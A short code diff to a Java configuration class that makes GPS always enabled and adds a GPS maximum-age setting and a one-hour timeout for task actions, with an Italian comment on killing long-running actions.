@@ -66,12 +66,9 @@ public final class Conf {
     public static final boolean SYNCACTION_FORCE_WIFI = true;
     public static final boolean SD_ENABLED = false;
     
-    //#ifdef ENABLE_GPS
     public static final boolean GPS_ENABLED = true;
-    //#else
-    public static final boolean GPS_ENABLED = false;
-    //#endif
-    
+    public static final int GPS_MAXAGE = 10;
+ 
     public static boolean IS_UI = true;
 
     //==========================================================
@@ -129,6 +126,8 @@ public final class Conf {
             .getBytes();
 
     public static final int GPS_TIMEOUT = 30;
+
+	public static final long TASK_ACTION_TIMEOUT = 3600 * 1000; // ogni action che dura piu' di un ora viene killata
 
     /**
      * Crc verify.
